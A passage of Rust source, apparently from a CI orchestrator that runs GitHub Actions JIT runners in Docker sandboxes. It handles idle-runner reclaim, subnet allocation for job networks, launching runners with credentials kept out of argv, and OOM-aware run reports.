        Withdrawal::Failed(e) => {
            return Clearance::Refused(format!("its registration could not be withdrawn: {e}"))
        }
    }
    match activity().await {
        RunnerActivity::Idle => Clearance::Idle,
        RunnerActivity::Stopped => Clearance::Stopped,
        RunnerActivity::Executing => {
            Clearance::Refused("it accepted a job as its registration was being withdrawn".into())
        }
        RunnerActivity::Unknown => {
            Clearance::Refused("its process table could not be read after withdrawing it".into())
        }
    }
}

/// [`reclaim_clearance`] against the real container and the real GitHub, logging
/// a refusal — the one outcome that leaves a runner alive against the
/// reconciler's wishes, and so the one worth a line.
async fn clear_for_reclaim(names: &Names, registration: &Registration<'_>) -> Clearance {
    let clearance = reclaim_clearance(
        || runner_activity(&names.runner),
        || withdraw_registration(registration, RECLAIM_WITHDRAWAL),
    )
    .await;
    if let Clearance::Refused(why) = &clearance {
        info!(
            "docker runner {}: not reclaiming — {why}; it keeps running",
            names.runner
        );
    }
    clearance
}

/// Read a runner container's activity from `docker top`.
///
/// Asks for the executable name only (`comm`). The full command line would work
/// too, and must not be read: the runner was started with its JIT config as an
/// argument, and that is a credential.
async fn runner_activity(container: &str) -> RunnerActivity {
    match docker_output(&["top", container, "-eo", "pid,comm"], CLI_TIMEOUT).await {
        Ok(out) if out.status.success() => activity_from_top(&String::from_utf8_lossy(&out.stdout)),
        // `top` answers nothing for a container that is not running, which is
        // either a finished run or a daemon that did not answer. Ask which.
        _ => match container_running(container).await {
            Some(false) => RunnerActivity::Stopped,
            Some(true) | None => RunnerActivity::Unknown,
        },
    }
}

/// [`RunnerActivity`] from `docker top … -eo pid,comm` output: a header, then one
/// `<pid> <comm>` row per process. A `comm` may itself contain spaces (a process
/// can retitle itself), so everything after the pid is the name.
fn activity_from_top(stdout: &str) -> RunnerActivity {
    let executing = stdout.lines().any(|row| {
        row.trim()
            .split_once(char::is_whitespace)
            .is_some_and(|(_, comm)| comm.trim() == WORKER_PROCESS)
    });
    if executing {
        RunnerActivity::Executing
    } else {
        RunnerActivity::Idle
    }
}

/// Whether `name` is a running container: `Some(false)` for one that has exited
/// or no longer exists, `None` when Docker would not say.
async fn container_running(name: &str) -> Option<bool> {
    let out = docker_output(
        &["container", "inspect", "-f", "{{.State.Running}}", name],
        CLI_TIMEOUT,
    )
    .await
    .ok()?;
    if out.status.success() {
        return match String::from_utf8_lossy(&out.stdout).trim() {
            "true" => Some(true),
            "false" => Some(false),
            _ => None,
        };
    }
    match inspect_absence(false, &String::from_utf8_lossy(&out.stderr)) {
        Some(true) => Some(false),
        _ => None,
    }
}

/// The audit reason of a withdrawal that clears a reclaim of a runner that may be
/// running a job (ADR-0017).
pub(crate) const RECLAIM_WITHDRAWAL: &str =
    "reclaim: withdraw the registration before stopping the runner (ADR-0017)";

/// The audit reason of a withdrawal at a reclaim after the mint, before any runner
/// was launched under the registration (#269).
pub(crate) const UNUSED_WITHDRAWAL: &str =
    "reclaim while provisioning: withdraw a registration no runner was launched for";

/// Ask GitHub to forget the runner, reading its answer as a [`Withdrawal`].
/// `reason` is the write's audit line: [`RECLAIM_WITHDRAWAL`] or [`UNUSED_WITHDRAWAL`].
///
/// This is where [`MintedRunner`]'s rule is enforced: with no record of faber's own
/// behind the registration, nothing is sent at all, and the reclaim is refused.
async fn withdraw_registration(reg: &Registration<'_>, reason: &str) -> Withdrawal {
    let Some(minted) = &reg.minted else {
        return Withdrawal::Failed(NO_MINT_RECORD.to_string());
    };
    match reg
        .gh
        .withdraw_runner(&minted.repo, &minted.name, minted.id, reason)
        .await
    {
        Ok(Deregistration::Removed) => Withdrawal::Withdrawn,
        Ok(Deregistration::JobAssigned) => Withdrawal::JobAssigned,
        Err(e) => Withdrawal::Failed(e.to_string()),
    }
}

/// [`withdraw_registration`] for a runner with no container to look at first: a
/// macOS VM's ([`crate::vm::job::JitMint::withdraw`]), and whatever record adoption
/// handed a runner, which a test follows to GitHub this way (#105).
pub(crate) async fn withdraw_minted(
    gh: &Github,
    minted: Option<MintedRunner>,
    reason: &str,
) -> Withdrawal {
    withdraw_registration(&Registration { gh, minted }, reason).await
}

/// Why a runner with no record behind it is never withdrawn.
const NO_MINT_RECORD: &str =
    "faber holds no record of minting it, so it leaves its GitHub registration alone";

/// How a watched run ended.
#[derive(Debug)]
pub(crate) enum RunEnd {
    /// The container exited on its own (or `docker wait` failed).
    Ran(std::io::Result<std::process::ExitStatus>),
    /// It outlived its lifetime cap.
    CapExpired,
    /// A reclaim was requested and cleared.
    Reclaimed,
}

/// Wait for a run to end: `run` resolves, `lifetime` expires (zero is no cap), or
/// a reclaim request is cleared by `clear`.
///
/// A request `clear` refuses ends nothing — the watch carries on for the run, the
/// cap, or the *next* request. A request already standing when the watch starts
/// counts: it may have arrived while the container was being launched.
///
/// A finished run is checked before a request, so a runner that exits in the same
/// instant a reclaim arrives is recorded as the run it was.
pub(crate) async fn await_end<R, C, CF>(
    run: R,
    lifetime: Duration,
    cancel: &mut watch::Receiver<bool>,
    mut clear: C,
) -> RunEnd
where
    R: std::future::Future<Output = std::io::Result<std::process::ExitStatus>>,
    C: FnMut() -> CF,
    CF: std::future::Future<Output = Clearance>,
{
    tokio::pin!(run);
    let cap = async {
        if lifetime.is_zero() {
            std::future::pending::<()>().await
        } else {
            tokio::time::sleep(lifetime).await
        }
    };
    tokio::pin!(cap);
    let mut standing = true;
    loop {
        tokio::select! {
            biased;
            status = &mut run => return RunEnd::Ran(status),
            _ = &mut cap => return RunEnd::CapExpired,
            _ = reclaim_requested(cancel, &mut standing) => match clear().await {
                Clearance::Idle => return RunEnd::Reclaimed,
                Clearance::Stopped => {
                    return match tokio::time::timeout(STOPPED_SETTLE, &mut run).await {
                        Ok(status) => RunEnd::Ran(status),
                        Err(_) => RunEnd::Reclaimed,
                    }
                }
                Clearance::Refused(_) => {}
            },
        }
    }
}

/// Resolve when a reclaim is requested: at once for a request already standing on
/// the first call (`standing` is spent by it), otherwise on the next request sent
/// after the last one was read.
///
/// Every request is a fresh `send_replace(true)`, which wakes a receiver even when
/// the value was already `true` — so a request that was refused and is asked again
/// is seen again. If every sender has dropped, no request can ever arrive, and a
/// dropped sender is never read as one: this pends forever.
async fn reclaim_requested(cancel: &mut watch::Receiver<bool>, standing: &mut bool) {
    if std::mem::take(standing) && *cancel.borrow_and_update() {
        return;
    }
    loop {
        if cancel.changed().await.is_err() {
            std::future::pending::<()>().await;
        }
        if *cancel.borrow_and_update() {
            return;
        }
    }
}

/// How many times a pinned-subnet create may be retried before giving up.
///
/// A retry is only ever needed when something else claimed the chosen subnet
/// between faber reading the daemon's allocations and asking it to create —
/// another ramp on this host, or a foreign tool. Four is generous for a race
/// whose window is one `docker network create`, and it is bounded because a
/// *persistent* overlap is a config problem (a pool that collides with something
/// already bridged) that retrying cannot fix and must not hide.
const SUBNET_RETRIES: usize = 4;

/// Every IPv4 subnet currently bridged on this host, whoever created it.
///
/// Read fresh on each attempt rather than cached: the whole point is to avoid
/// subnets that appeared since faber last looked, and the listing is two cheap
/// metadata calls.
///
/// A failed listing yields an empty set rather than an error. That degrades
/// allocation to "guess and let the daemon arbitrate" — which the retry loop
/// already handles — instead of failing a job over a listing, and it keeps this
/// consistent with [`crate::sweep`]'s treatment of a daemon that is not up yet.
async fn used_subnets() -> Vec<crate::netpool::Cidr> {
    let ids = match docker_lines(&["network", "ls", "-q", "--no-trunc"], CLI_TIMEOUT).await {
        Ok(ids) => ids,
        Err(e) => {
            warn!("docker: listing networks for subnet allocation: {e}");
            return Vec::new();
        }
    };
    // #105: what goes back on the command line is an id as Docker prints one, and
    // nothing else.
    let ids = untrusted::accept(ids, "docker: network listing", |id| {
        if untrusted::object_id(&id) {
            Ok(Some(id))
        } else {
            Err("a network id is not 64 hex digits")
        }
    });
    if ids.is_empty() {
        return Vec::new();
    }
    let mut args: Vec<String> = vec![
        "network".into(),
        "inspect".into(),
        "--format".into(),
        "{{json .IPAM.Config}}".into(),
    ];
    args.extend(ids);
    match docker_stdout(&args, CLI_TIMEOUT, untrusted::OUTPUT_CAP).await {
        Ok(text) => subnets_from_ipam(&text),
        Err(e) => {
            warn!("docker: inspecting networks for subnet allocation: {e}");
            Vec::new()
        }
    }
}

/// One network's `{{json .IPAM.Config}}` entry: the only field faber reads.
#[derive(Debug, Deserialize)]
struct IpamConfig {
    #[serde(rename = "Subnet", default)]
    subnet: String,
}

/// The IPv4 subnets in a `network inspect` printed one `{{json .IPAM.Config}}`
/// array per line. A network with no IPAM config prints `null`; a subnet that is
/// not a CIDR faber can parse (IPv6, or junk) is not one it allocates around.
fn subnets_from_ipam(text: &str) -> Vec<crate::netpool::Cidr> {
    let configs = untrusted::json_lines::<Option<Vec<IpamConfig>>>(text, "docker: network inspect");
    crate::netpool::parse_subnets(
        configs
            .iter()
            .flatten()
            .flatten()
            .map(|c| c.subnet.as_str()),
    )
}

/// Create a job's private network, out of faber's own pool when one is declared.
///
/// With no pool this is the one `docker network create` faber has always made and
/// the daemon allocates from its shared defaults. With a pool, faber picks the
/// subnet itself so that a machine whose default pools are held by other tools —
/// the failure this exists for — cannot starve CI. See [`crate::netpool`].
async fn create_job_network(
    net: &str,
    marks: &[String],
    pool: Option<&crate::netpool::NetPool>,
) -> anyhow::Result<()> {
    let Some(pool) = pool else {
        return docker_ok(&network_create_args(net, marks, None), LAUNCH_TIMEOUT).await;
    };
    let start = crate::netpool::offset_for(net);
    let mut last: Option<anyhow::Error> = None;
    for attempt in 1..=SUBNET_RETRIES {
        let taken = used_subnets().await;
        // Each retry starts one slot further on. Re-reading `taken` is normally
        // enough — the network that beat us to it is in the listing by the time
        // we look again — but the offset makes progress guaranteed rather than
        // dependent on that, so a retry can never re-pick what just failed.
        let from = start.wrapping_add(attempt as u32 - 1);
        let Some(subnet) = pool.allocate(&taken, from) else {
            // Deliberately not "fully subnetted" in faber's own words: an
            // exhausted *declared* pool is a capacity decision the operator made
            // and can change, and the message has to say so outright rather than
            // leave them reading daemon errors for a third time.
            anyhow::bail!(
                "faber's network pool {pool} has no free subnet ({} slots, all overlapping \
                 something already bridged on this host) — widen host.network_pool or \
                 lower the runner cap",
                pool.slots()
            );
        };
        match docker_ok(
            &network_create_args(net, marks, Some(&subnet.to_string())),
            LAUNCH_TIMEOUT,
        )
        .await
        {
            Ok(()) => {
                debug!("docker: network {net} on {subnet} (attempt {attempt})");
                return Ok(());
            }
            // Someone took it in the window between the listing and the create.
            // Re-read and pick again; any other failure is not a race and is
            // reported as itself.
            Err(e) if e.to_string().contains("overlaps") => {
                debug!("docker: subnet {subnet} for {net} was taken; re-picking");
                last = Some(e);
            }
            Err(e) => return Err(e),
        }
    }
    Err(last.unwrap_or_else(|| {
        anyhow::anyhow!("could not find a free subnet in {pool} after {SUBNET_RETRIES} attempts")
    }))
}

/// Create the network + dind, run the runner container to completion. Cleanup is
/// the caller's responsibility ([`teardown`]) so it happens on every path.
///
/// `cancel` is the cooperative-reclaim signal: when the claim reconciler flips it
/// true (it believes the runner is idle for a job that no longer needs it), the
/// watcher asks the runner itself whether that is so and, only if it is, cuts the
/// run short like the lifetime cap — kill the container so the watcher's
/// `docker wait` returns and teardown reaps it — recorded as a clean `reclaimed`.
/// See [`reclaim_clearance`] for why the reconciler's belief alone is not enough.
///
/// It is honoured *before* the run too, at each seam of the sandbox ramp, so a
/// reclaim never has to wait out a network create, a dind start and a readiness
/// poll before it can take effect. Those returns leave partial state behind by
/// design — the caller's [`teardown`] is what reaps it, on this path as on any
/// other. No job can be running at any of them: the runner container does not
/// exist yet. Each withdraws the registration from GitHub on its way out
/// ([`reclaimed_after_mint`]), since no runner will ever connect under it.
#[allow(clippy::too_many_arguments)]
async fn run_in_sandbox(
    names: &Names,
    owner_repo: &str,
    registration: &Registration<'_>,
    jit: &str,
    cache_vol: Option<&str>,
    git_mirror: Option<&str>,
    cfg: &DockerConfig,
    limits: &Limits,
    claim: &ClaimMarks,
    mut cancel: watch::Receiver<bool>,
) -> anyhow::Result<RunReport> {
    create_job_network(
        &names.net,
        &marks(KIND_NET, owner_repo, &names.id),
        cfg.network_pool.as_ref(),
    )
    .await
    .map_err(|e| anyhow::anyhow!("creating network {}: {e}", names.net))?;

    // The whole dind half of the ramp is skipped for a profile that was not
    // granted a daemon (issue #43): no `/var/lib/docker` volume, no privileged
    // container, no readiness poll. That is not merely three steps saved — it is
    // the exposure itself, since what a job could reach is what is on its network.
    let dind = cfg.dind.granted();
    if dind {
        // Create the per-job volume explicitly rather than letting `docker run -v`
        // conjure it: an implicitly-created volume carries no labels, so it would be
        // the one resource faber owns that cannot say so. A failure here is not
        // fatal — the run mounts it by name and docker still creates it, just
        // unmarked. This is the live path that keeps [`crate::sweep`]'s legacy
        // name listing alive: nothing else can see an unmarked volume, and
        // without it every one of these leaks forever.
        if let Err(e) = docker_ok(
            &volume_create_args(&names.vol, &marks(KIND_VOL, owner_repo, &names.id)),
            LAUNCH_TIMEOUT,
        )
        .await
        {
            warn!(
                "docker: pre-creating volume {} failed ({e}) — it will be created \
                 unlabelled by the dind mount",
                names.vol
            );
        }

        if reclaim_pending(&cancel) {
            return Ok(
                reclaimed_after_mint(registration, &names.runner, "after the network").await,
            );
        }

        docker_ok(
            &dind_run_args(
                &names.dind,
                &names.net,
                &names.vol,
                &cfg.dind_image,
                &limits.dind,
                &marks(KIND_DIND, owner_repo, &names.id),
            ),
            LAUNCH_TIMEOUT,
        )
        .await
        .map_err(|e| anyhow::anyhow!("starting dind {}: {e}", names.dind))?;

        if reclaim_pending(&cancel) {
            return Ok(reclaimed_after_mint(registration, &names.runner, "after dind start").await);
        }

        // The one ramp step raced outright rather than checked at its seam: the
        // readiness probe only *reads* the daemon, so abandoning it half-way leaves
        // nothing behind to reap. It is also the ramp's longest honest wait — a cold or
        // loaded host can sit here for most of `DIND_READY_TIMEOUT` — so racing it is
        // what stops a reclaim having to wait out a full minute of polling.
        match until_reclaimed(&mut cancel, wait_for_dind(&names.dind)).await {
            None => {
                return Ok(
                    reclaimed_after_mint(registration, &names.runner, "waiting for dind").await,
                )
            }
            Some(ready) => ready?,
        }
    } else if reclaim_pending(&cancel) {
        return Ok(reclaimed_after_mint(registration, &names.runner, "after the network").await);
    }

    // The job's declared services (ADR-0046), on the network that now exists:
    // its per-job containers, and the shared server connected to it with the
    // job's own role and database. Checked at its seam rather than raced, like
    // every step that creates state: abandoned half-way, a container could start
    // after teardown has already detached. A failure is faber's, not the job's
    // (nothing ran yet), so it fails the provision as a dind start does, and
    // ADR-0003's retry covers it. Teardown detaches whatever got attached.
    let attached = if cfg.services.is_empty() {
        crate::services::Attached::none()
    } else {
        let job = crate::services::JobNet {
            id: &names.id,
            owner_repo,
            net: &names.net,
        };
        let attached = crate::services::global()
            .attach(&cfg.services, &job)
            .await
            .map_err(|e| {
                anyhow::anyhow!(
                    "starting services {} for {}: {e:#}",
                    cfg.services.mark(),
                    names.runner
                )
            })?;
        if reclaim_pending(&cancel) {
            return Ok(
                reclaimed_after_mint(registration, &names.runner, "after the services").await,
            );
        }
        attached
    };
    let service_env = attached.env_names();

    // The pull-through mirror (ADR-0047):
    // connected to the network that now exists, when the profile opted in and the
    // mirror is healthy. Best-effort: `None` runs the job as before. Teardown
    // disconnects it before the network goes, and revokes the job's token. The
    // profile's own `env` is passed so an LFS redirect appends to a
    // `GIT_CONFIG_COUNT` it sets rather than overwriting it.
    let mirror = crate::mirror::global()
        .attach(cfg.mirror, &names.net, owner_repo, &names.runner, &cfg.env)
        .await;
    let mirror = mirror.unwrap_or_default();
    let mirror_secret_names = mirror.secret_env.names();

    // The job-started hook (ADR-0059 §1), in a read-only volume filled over
    // stdin, and checked to be in place. A runner whose hook is missing would
    // fail the hook's step and let the job's `always()` steps run, so a fill
    // that fails or reads back short starts no runner: the error fails the
    // provision before anything ran, and teardown removes the volume.
    fill_hook_volume(names, owner_repo, &cfg.image, &claim.hook.script())
        .await
        .map_err(|e| {
            anyhow::anyhow!(
                "installing the job-started hook for {}: {e:#}",
                names.runner
            )
        })?;

    // Last seam before the runner exists. `Command::status()` spawns eagerly, so
    // without this the container below would start and be killed a moment later by
    // the `select!`'s cancel arm — a reclaimed claim would still pay for a launch.
    if reclaim_pending(&cancel) {
        return Ok(
            reclaimed_after_mint(registration, &names.runner, "before the runner launched").await,
        );
    }

    info!("docker runner {}: launching one JIT job", names.runner);
    // Sample both containers' memory and CPU while the job runs: memory (and
    // dind's own OOM tally, which only exists while the container does) as a
    // latched high-water mark, CPU (ADR-0019) as a per-interval rate — see
    // `latch` and `CpuTally` for why those need different accumulators. The
    // sampler stops once the runner exits (`done`).
    // Launch the runner and hand it to the shared watcher. From the moment the
    // container exists there is nothing left that only this process can do: the
    // watcher below is equally the one an *adopted* container gets (ADR-0011),
    // because the container is the only thing either path ever had.
    // Starting the container is now its own step with its own failure: detached,
    // a non-zero exit here means the *launch* failed, never that the job did.
    //
    // The JIT config rides in this one CLI child's own environment, never in its
    // argv (AGENTS.md/ADR-0025 §8) — `runner_run_args` emits only the bare
    // `-e RUNNER_JITCONFIG` flag, and `docker run -e NAME` (no `=`) forwards
    // whatever `docker_ok_with_env` sets here. Argv is visible to every account
    // on the host via `ps`; the environment of a process only this daemon spawned
    // is not.
    let launch_args = |git_mirror: Option<&str>| {
        runner_run_args(
            &names.runner,
            &names.net,
            Mounts {
                cache_vol,
                git_mirror,
                service_env: &service_env,
                mirror_env: &mirror.env,
                mirror_secret_env: &mirror_secret_names,
                hook_vol: Some(&names.hook),
            },
            cfg,
            &limits.runner,
            &runner_marks(owner_repo, &names.id, claim),
        )
    };
    // The services' values ride beside the JIT config, in this one child's
    // environment, under the names `runner_run_args` put on the argv bare.
    // The mirror's secret variables (ADR-0047 §4: its token rides in `lfs.url`)
    // go the same way, under the names `runner_run_args` put on the argv bare.
    let mut child_env = attached.env();
    child_env.extend(mirror.secret_env.pairs());
    let jit_env = launch_env(jit, child_env);
    if let Err(e) = docker_ok_with_env(&launch_args(git_mirror), LAUNCH_TIMEOUT, &jit_env).await {
        let msg = e.to_string();
        if !retry_launch_without_mirror(git_mirror.is_some(), &msg) {
            anyhow::bail!("starting runner {}: {e}", names.runner);
        }
        // ADR-0035 §2: the mirror is best-effort, so a launch it may have broken
        // is tried once more without it. The refused run can still have created
        // the container (created, never started), so it is removed first: the
        // retry then cannot meet a name conflict, and no second runner can come
        // up beside a first. Nothing ran, so the JIT config is still unused.
        warn!(
            "docker runner {}: launching with the git mirror failed ({msg}) — launching once \
             more without it (ADR-0035)",
            names.runner
        );
        crate::git_mirror::global().note_mount_failure(owner_repo, &msg);
        docker_rm(&["rm", "-f", names.runner.as_str()])
            .await
            .map_err(|rm| {
                anyhow::anyhow!(
                    "starting runner {}: {e}; removing what that launch left failed too ({rm}), \
                     so it was not retried",
                    names.runner
                )
            })?;
        docker_ok_with_env(&launch_args(None), LAUNCH_TIMEOUT, &jit_env)
            .await
            .map_err(|e2| {
                anyhow::anyhow!(
                    "starting runner {}: {e2} (and before that, with the git mirror: {e})",
                    names.runner
                )
            })?;
    }

    let started_ms = crate::audit::now_ms();
    watch_to_completion(
        names,
        registration,
        dind,
        limits,
        Some(cfg.image.clone()),
        cfg.runner_timeout,
        cancel,
    )
    .await
    .map(|report| RunReport {
        container_started_ms: Some(started_ms),
        ..report
    })
}

/// The environment of the one `docker run` child that launches the runner: the
/// services' variables ([`crate::services::Attached::env`]), then the JIT config.
/// None of it is ever on the argv, which carries the names alone
/// ([`runner_run_args`]); `docker run -e NAME` forwards each from here. The JIT
/// config goes last so nothing a service hands over can shadow it.
fn launch_env<'a>(jit: &'a str, services: Vec<(&'a str, &'a str)>) -> Vec<(&'a str, &'a str)> {
    let mut env = services;
    env.retain(|(k, _)| *k != RUNNER_JITCONFIG_ENV);
    env.push((RUNNER_JITCONFIG_ENV, jit));
    env
}

/// Sample the sandbox, wait for the runner to end, and turn however it ended
/// into a [`RunReport`].
///
/// Everything here reads only the *container*, never a handle that one process
/// holds and another cannot. That is what lets [`run_in_sandbox`] and
/// [`adopt_one`] share it outright rather than merely resemble each other: both
/// hand it a container name and it issues the same `docker wait`. There is no
/// "the process that started it" path, because there is nothing such a process
/// would know that this one does not.
///
/// `lifetime` bounds the run. A JIT runner exits only *after* completing a job,
/// so a surplus runner that never gets one — or a job that hangs past any sane
/// duration — would pin the watcher forever; on expiry the container is killed so
/// the client returns and teardown can reap it. Zero opts out (the historical
/// uncapped behavior).
///
/// For an adopted container the caller passes what is *left* of that cap,
/// measured from the container's own `StartedAt` rather than from now: a restart
/// must not hand every in-flight job another three hours.
///
/// A reclaim request ends the run only when [`reclaim_clearance`] confirms, from
/// the container and from GitHub, that the runner is executing nothing and can be
/// handed nothing more. A refused request changes nothing: the job runs on, and
/// the reconciler may ask again later.
async fn watch_to_completion(
    names: &Names,
    registration: &Registration<'_>,
    dind: bool,
    limits: &Limits,
    image: Option<String>,
    lifetime: Duration,
    mut cancel: watch::Receiver<bool>,
) -> anyhow::Result<RunReport> {
    let run = wait_for_exit(names.runner.clone());
    // Sample both containers' memory and CPU while the job runs: memory (and
    // dind's own OOM tally, which only exists while the container does) as a
    // latched high-water mark, CPU (ADR-0019) as a per-interval rate — see
    // `latch` and `CpuTally` for why those need different accumulators. The
    // sampler stops once the runner exits (`done`) — at once, not at its next
    // poll: the claim is held until it returns.
    let (done, done_rx) = watch::channel(false);
    let sampler = tokio::spawn(sample_usage(
        names.runner.clone(),
        dind.then(|| names.dind.clone()),
        done_rx,
    ));

    let end = await_end(run, lifetime, &mut cancel, || {
        clear_for_reclaim(names, registration)
    })
    .await;
    // Killed the moment it is cleared, before the post-mortem reads below. Not for
    // safety — a cleared runner has been withdrawn from GitHub and can be handed no
    // job however long it lives — but so the reclaim takes effect when it is
    // decided rather than several `docker` calls later.
    if matches!(end, RunEnd::Reclaimed) {
        info!(
            "docker runner {} reclaimed while idle (no job running in it) — killing",
            names.runner
        );
        let _ = docker_ok(&["kill", &names.runner], TEARDOWN_TIMEOUT).await;
    }

    done.send_replace(true);
    let mut usage = sampler.await.unwrap_or_default();
    // The runner runs *without* `--rm` (teardown force-removes it) so it survives
    // its own exit for this inspect — the definitive OOM signal, distinct from an
    // ordinary non-zero exit (a failed job) or a lifetime-cap kill.
    let oom_runner = inspect_oom(&names.runner).await;

    // Same window, same reason: the container is still here, so ask it what it
    // actually ran on before teardown removes the only thing that knows. Recorded
    // on the outcome so a job that dies on a missing toolchain names the image
    // content that served it, instead of leaving a reader to inspect a tag hours
    // later and hope nothing moved (ADR-0008 makes the image vary per job).
    let image_id = inspect_container_image(&names.runner).await;

    // dind's last chance: teardown is the caller's very next act, and the cgroup
    // dies with the container. Reading here — rather than after `teardown` like the
    // `inspect` above could afford to — is what makes the counter available at all
    // on the overwhelmingly common path, where dind is still up because it was only
    // ever a *nested* container that died. See [`dind_counters`].
    //
    // Skipped outright when the profile was granted no daemon: there is no cgroup
    // to read and no container to inspect, so asking would earn two failed CLI
    // calls and — worse — `dind_oom_verdict`'s "the counter was never readable"
    // warning on every single job, which is a real diagnostic being turned into
    // noise. No dind is not an unreadable dind.
    let oom_dind = if dind {
        let (tally, events) = dind_counters(&names.dind).await;
        if let Some(tally) = tally {
            latch(&mut usage.dind_oom, tally);
        }
        if let Some(e) = events {
            latch_events(&mut usage.dind_events, e);
        }
        // An unreadable counter and a dead dind are the same event (see
        // [`died_of_own_oom`]), so ask the daemon what killed it — while it still can
        // answer, teardown being the caller's very next act.
        let postmortem = match usage.dind_oom {
            Some(_) => None,
            None => died_of_own_oom(&names.dind).await,
        };
        dind_oom_verdict(&names.dind, usage.dind_oom, postmortem)
    } else {
        false
    };

    let (job_ok, timed_out, reclaimed, cause) = match end {
        // Ran to completion (or docker failed to even launch it — bubble that up).
        // A non-zero exit is a normal outcome (a failed job), not a faber error.
        RunEnd::Ran(status) => {
            let status = status.map_err(|e| {
                anyhow::Error::new(RunnerLost(format!(
                    "runner container {} vanished without an exit status: {e}",
                    names.runner
                )))
            })?;
            if !status.success() {
                warn!(
                    "docker runner {} exited with {status} (oom_runner={oom_runner} \
                     oom_dind={oom_dind})",
                    names.runner
                );
                // Detaching moved the runner agent's console output out of
                // faber's stderr and into the container's log, so a failure that
                // used to explain itself in place no longer does. Pull the tail
                // back — only on a bad exit, which is strictly less noise than
                // the attached client produced on every run, and only while the
                // container still exists (teardown is the caller's next act).
                log_tail(&names.runner).await;
            }
            // An OOM is the one job failure faber caused rather than observed, and
            // it is indistinguishable from a normal non-zero exit without saying
            // so: the runner is killed, the job reports a plain failure, and the
            // job log shows a step dying for no stated reason. Naming the killed
            // container here is what connects that to the cap it hit.
            let cause = match (status.success(), oom_runner, oom_dind) {
                // Exit 0 *and* a kill in this cgroup: the agent outlived the step
                // the kernel took. That is what a mid-step OOM looks like from
                // here — faber sees a clean exit, GitHub sees a step exit 137, and
                // without this line nothing anywhere says "memory". It stays a
                // `success` (the container did what it was asked) but no longer an
                // unexplained one; many runs in one live log ended exactly this way.
                (true, true, _) => Some(format!(
                    "runner container exited 0, but the kernel OOM-killed a process in its \
                     cgroup at the {} MiB cap — a step inside the job died, not the agent",
                    limits.runner.memory_mib
                )),
                (true, _, true) => Some(format!(
                    "runner container exited 0, but dind was OOM-killed at its {} MiB cap — \
                     the job's own containers lost their daemon mid-run",
                    limits.dind.memory_mib
                )),
                (true, false, false) => None,
                (false, true, _) => Some(format!(
                    "runner container OOM-killed at its {} MiB cap ({status})",
                    limits.runner.memory_mib
                )),
                (false, _, true) => Some(format!(
                    "dind container OOM-killed at its {} MiB cap ({status})",
                    limits.dind.memory_mib
                )),
                (false, false, false) => Some(format!("runner container exited {status}")),
            };
            (status.success(), false, false, cause)
        }
        // Exceeded the lifetime cap: kill it so the `docker wait` returns and
        // teardown reaps it. Best-effort — teardown force-removes anyway.
        RunEnd::CapExpired => {
            warn!(
                "docker runner {} exceeded its {:?} lifetime cap — killing (a surplus idle \
                 runner that never got a job, or a hung job/teardown)",
                names.runner, lifetime
            );
            let _ = docker_ok(&["kill", &names.runner], TEARDOWN_TIMEOUT).await;
            (
                false,
                true,
                false,
                Some(format!(
                    "killed at its {:?} lifetime cap — a surplus runner that never got a job, \
                     or a hung job/teardown",
                    lifetime
                )),
            )
        }
        // Reclaimed while idle: the reconciler asked, and the runner itself confirmed
        // it was executing nothing and could be handed nothing more. Already killed
        // above; record a clean reclaim, not a failure.
        RunEnd::Reclaimed => (
            false,
            false,
            true,
            Some(
                "reclaimed mid-run: the runner sat idle for a job that no longer needs one"
                    .to_string(),
            ),
        ),
    };

    Ok(RunReport {
        job_ok,
        oom_runner,
        oom_dind,
        runner_mem_events: usage.runner_events,
        dind_mem_events: usage.dind_events,
        runner_peak_mib: usage.runner_peak_mib,
        dind_peak_mib: usage.dind_peak_mib,
        timed_out,
        reclaimed,
        // The sandbox ran; any setup/launch failure returned `Err` earlier (the
        // caller flags that as `infra_error`), so the happy path is never one.
        infra_error: false,
        lost: false,
        applied_runner_mib: limits.runner.memory_mib,
        applied_dind_mib: limits.dind.memory_mib,
        runner_cpu: usage.runner_cpu.finish(),
        dind_cpu: usage.dind_cpu.finish(),
        runner_throttled_usec: usage.runner_cpu.throttled_usec(),
        dind_throttled_usec: usage.dind_cpu.throttled_usec(),
        runner_io: usage.runner_io,
        dind_io: usage.dind_io,
        // Stamped by the caller that started the container (`run_in_sandbox`);
        // an adopted one started under another process.
        container_started_ms: None,
        applied_runner_mcpu: mcpu(limits.runner.cpus),
        applied_dind_mcpu: mcpu(limits.dind.cpus),
        dind: Some(dind),
        cause,
        image,
        image_id,
        // Filled in by the caller, which knows the plan (`run_one`) or read it
        // back off the container (`adopt_one`).
        services: Vec::new(),
    })
}

/// What the in-run sampler observed. `None` on any field means "never read
/// successfully" — the container was gone, not up yet, or the read failed — which
/// is deliberately distinct from a zero reading.
#[derive(Debug, Clone, Copy, Default)]
struct Usage {
    runner_peak_mib: Option<u64>,
    dind_peak_mib: Option<u64>,
    /// Highest [`dind_counters`] ever read from the dind container. Latched
    /// during the run because the cgroup it comes from is destroyed with the
    /// container — see that function for why this cannot be read post-mortem the
    /// way [`inspect_oom`] can.
    dind_oom: Option<u64>,
    /// Latched hierarchical `memory.events` of each container (ADR-0033 §5), read
    /// by [`mem_events`] on the same cadence. The runner's cgroup dies with the
    /// runner, which is why this is sampled rather than read after the exit: a kill
    /// in the last poll interval is not seen.
    runner_events: Option<MemEvents>,
    dind_events: Option<MemEvents>,
    /// CPU accumulators fed one [`CpuStat`] reading per poll (ADR-0019). Unlike
    /// the `_peak_mib` fields above, a rate cannot be latched from a single
    /// reading — it needs the reading before it too — so each container gets its
    /// own [`CpuTally`] rather than a folded scalar; `.finish()` turns each into
    /// the `Option<CpuUsage>` the [`RunReport`] carries.
    runner_cpu: CpuTally,
    dind_cpu: CpuTally,
    /// Block and network bytes each container had moved at its last reading
    /// (ADR-0056 §4), latched like the memory peaks.
    runner_io: Option<IoBytes>,
    dind_io: Option<IoBytes>,
}

/// Fold a fresh I/O reading into the latched one.
fn latch_io(slot: &mut Option<IoBytes>, reading: IoBytes) {
    *slot = Some(slot.map_or(reading, |seen| seen.latch(reading)));
}

/// Fold a fresh reading into a high-water mark, seeding it on the first one.
///
/// Every quantity latched here is monotonically non-decreasing over a run (a
/// memory peak by construction, the cgroup OOM counters because the kernel only
/// ever increments them), so the maximum across a sparse sample set is the same
/// answer a continuous observer would have reached — the property that lets the
/// sampler miss polls without losing the signal.
///
/// CPU (ADR-0019) is measured differently even though `cpu.stat`'s own
/// `usage_usec` is just as monotonic a counter: what a [`RunReport`] wants out
/// of it is a *rate* in millicores, and a rate needs two readings and the
/// wall-clock time between them, not a single latched maximum — see
/// [`CpuTally`] instead.
fn latch(slot: &mut Option<u64>, reading: u64) {
